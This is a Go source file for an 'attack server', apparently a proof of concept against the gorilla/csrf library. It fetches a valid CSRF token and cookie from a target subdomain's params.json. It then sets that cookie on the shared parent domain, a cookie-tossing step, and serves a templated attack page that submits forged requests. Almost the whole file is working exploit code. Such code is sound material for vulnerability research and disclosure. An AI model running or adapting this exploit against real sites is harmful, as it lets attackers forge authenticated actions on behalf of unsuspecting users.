package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/publicsuffix"
)

// attackServer is the server that serves the attack page. It wraps a HTTP
// client used to scrape the target origin for CSRF cookie and token
// values to interpolate into pages it serves.
type attackServer struct {
	// target to scrape/CSRF attack
	target string
	// current cookie identify to use for CSRF attack
	currentCookie string
	// mutex for scraping target to prevent clobbering identities
	scrapeMutex sync.Mutex
	// client to use for scraping target w/ cookiejar
	client *http.Client
}

// newAttackServer creates a new attack server pointed at the specified target.
func newAttackServer(target string) *attackServer {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{Jar: jar}

	return &attackServer{
		target:      target,
		client:      client,
		scrapeMutex: sync.Mutex{},
	}
}

func (as *attackServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		if strings.HasPrefix(r.URL.Path, "/static/") {
			http.FileServer(assetHTTPFS).ServeHTTP(w, r)
			return
		}
		as.attackOriginHandler(w, r)
	default:
		http.Error(w, "invalid method", http.StatusMethodNotAllowed)
	}
}

// attackOriginHandler serves the attack page. It first scrapes the target for a
// valid CSRF token and cookie combination to use in its attack. It sets the
// CSRF cookie for the common top-level domain (e.g. example.test) using the
// exfiltrated value scraped from the target. Finally, it templates
// the attacker page with the scraped token and cookie values.
func (as *attackServer) attackOriginHandler(w http.ResponseWriter, _ *http.Request) {
	// make request to the target origin to fetch CSRF token & cookie values
	token, cookie, err := as.scrapeTarget(*domain)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// set a cookie for the common top-level domain (e.g. example.test)
	// using the exfiltrated CSRF cookie value scraped from the target
	clobberCookie := http.Cookie{
		Name:   "_gorilla_csrf",
		Value:  cookie,
		Path:   "/submit",
		Domain: *domain,
	}
	http.SetCookie(w, &clobberCookie)

	// template the attacker page
	w.Header().Set("Content-Type", "text/html")
	data := map[string]any{
		"Domain": *domain,
		"Token":  token,
		"Cookie": cookie,
		"Today":  time.Now().Format("2006-01-02"),
	}
	b := bytes.NewBuffer(nil)
	if err := templates.ExecuteTemplate(b, "attack.html", data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
		return
	}
}

// scrapeTarget scrapes the target origin for a CSRF token and cookie value.
func (as *attackServer) scrapeTarget(domain string) (token, cookie string, err error) {
	as.scrapeMutex.Lock()
	defer as.scrapeMutex.Unlock()

	// fetch CSRF token & cookie from the target origin
	resp, err := as.client.Get(fmt.Sprintf("https://target.%s/params.json", domain))
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", "", fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	var params struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&params); err != nil {
		return "", "", err
	}

	// use our current cookie; override if we have been given a new one
	cookie = as.currentCookie
	cookieHeader := resp.Header.Get("Set-Cookie")
	if strings.HasPrefix(cookieHeader, "_gorilla_csrf=") {
		cookieParts := strings.Split(cookieHeader, ";")
		cookie = strings.TrimPrefix(cookieParts[0], "_gorilla_csrf=")
	}

	if params.Token == "" {
		return "", "", fmt.Errorf("no token found")
	}
	if cookie == "" {
		return "", "", fmt.Errorf("no cookie found")
	}

	// persist cookie for next scrape
	as.currentCookie = cookie

	return params.Token, cookie, nil
}
